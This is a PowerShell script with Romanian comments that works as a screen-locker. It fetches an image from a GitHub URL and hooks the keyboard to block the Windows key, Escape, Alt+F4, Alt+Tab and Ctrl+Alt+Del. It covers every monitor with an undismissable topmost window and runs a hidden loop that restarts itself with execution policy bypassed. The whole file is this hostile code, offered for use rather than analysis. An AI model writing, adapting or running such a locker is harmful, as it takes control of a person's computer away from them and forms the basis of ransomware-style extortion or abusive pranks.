# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Blocare taste și combinații critice
function Block-SystemKeys {
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;

        public class KeyboardBlocker {
            private static IntPtr hookId = IntPtr.Zero;

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

            private static LowLevelKeyboardProc proc = HookCallback;

            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;

            [DllImport("user32.dll")]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll")]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll")]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll")]
            private static extern IntPtr GetModuleHandle(string lpModuleName);

            public static void Block() {
                hookId = SetHook(proc);
            }

            public static void Unblock() {
                UnhookWindowsHookEx(hookId);
            }

            private static IntPtr SetHook(LowLevelKeyboardProc proc) {
                using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
                using (var curModule = curProcess.MainModule) {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                    int vkCode = Marshal.ReadInt32(lParam);

                    // Blochează tastele critice
                    if (vkCode == 0x5B || vkCode == 0x5C || // Tasta Windows
                        vkCode == 0x1B ||                   // Escape
                        vkCode == 0x73 ||                   // Alt+F4 (F4)
                        vkCode == 0x09 ||                   // Alt+Tab (Tab)
                        vkCode == 0x2E) {                   // Ctrl+Alt+Del (Delete)
                        return (IntPtr)1; // Blochează tasta
                    }
                }
                return CallNextHookEx(hookId, nCode, wParam, lParam);
            }
        }
"@
    [KeyboardBlocker]::Block()
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        $forms += $form
    }

    # Rulează formularele pe toate monitoarele
    foreach ($form in $forms) {
        [void]$form.Show()
    }

    [System.Windows.Forms.Application]::Run()
}

# Funcție pentru oprirea completă a aplicației
function Stop-All {
    [KeyboardBlocker]::Unblock()
    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
    exit
}

# Funcție de monitorizare pentru repornire automată
function Monitor-Image {
    $scriptPath = $MyInvocation.MyCommand.Definition

    while ($true) {
        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$scriptPath*" }
        if (-not $processes) {
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
        }
        Start-Sleep -Seconds 2
    }
}

# Pornire aplicație principală și monitorizare
Download-Image
Block-SystemKeys
Start-Job -ScriptBlock { Monitor-Image }
Show-FullScreenImage
